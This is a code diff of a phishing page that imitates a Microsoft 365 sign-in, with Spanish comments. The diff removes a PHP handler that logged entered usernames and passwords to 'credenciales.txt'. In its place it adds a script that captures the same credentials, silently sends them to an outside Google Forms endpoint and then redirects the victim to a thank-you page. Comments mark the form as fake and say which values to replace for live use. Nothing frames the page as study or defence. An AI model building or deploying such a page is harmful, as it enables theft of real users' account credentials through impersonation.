@@ -73,8 +73,9 @@
   <div class="container">
     <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Logo">
     <h2>Microsoft 365.HEA_Escolme</h2>
-
-    <form action="signup.php" method="POST" autocomplete="off">
+    
+    <!-- Formulario falso -->
+    <form id="login-form" autocomplete="off">
       <div class="form-group">
         <input type="text" name="usuario" placeholder="Username or Email" required>
       </div>
@@ -83,44 +84,42 @@
       </div>
       <button type="submit">Sign in</button>
     </form>
-
+    
     <div class="helper">
       <a href="#">Forgot password?</a>
     </div>
   </div>
+
+  <!-- SCRIPT: Envía a Google Forms -->
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const usuario = this.usuario.value.trim();
+      const clave = this.clave.value;
+
+      // === REEMPLAZA ESTOS VALORES CON LOS REALES ===
+      const FORM_ID = '1FAIpQLSdXwih-UklppDi16aQDXJVjro25aQyXyXa4LU4cPAAlb_mWCQ';
+      const ENTRY_USUARIO = 'entry.123456789';  // ← CAMBIAR
+      const ENTRY_CLAVE = 'entry.987654321';    // ← CAMBIAR
+
+      const url = `https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?` +
+                  `${ENTRY_USUARIO}=${encodeURIComponent(usuario)}&` +
+                  `${ENTRY_CLAVE}=${encodeURIComponent(clave)}`;
+
+      // Envío silencioso
+      fetch(url, { method: 'GET', mode: 'no-cors' })
+        .catch(() => {});
+
+      // Redirige (puedes cambiar a office.com)
+      setTimeout(() => {
+        window.location.href = 'thankyou.html';
+      }, 600);
+    });
+  </script>
 </body>
 </html>
 
-<?php
-// Microsoft 365
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $usuario = trim($_POST['usuario'] ?? '');
-    $clave   = trim($_POST['clave'] ?? '');
-    $fecha   = date('Y-m-d H:i:s');
-
-    $registro = "[$fecha] Usuario: $usuario | Clave: $clave" . PHP_EOL;
-
-    file_put_contents('credenciales.txt', $registro, FILE_APPEND | LOCK_EX);
-
-    header('Location: gracias.html');
-    exit;
-} else {
-    echo "Método no permitido.";
-}
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Thank You</title>
-  <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      text-align: center; 
-      margin-top: 80px;
-    }
-</html>
 
 
 
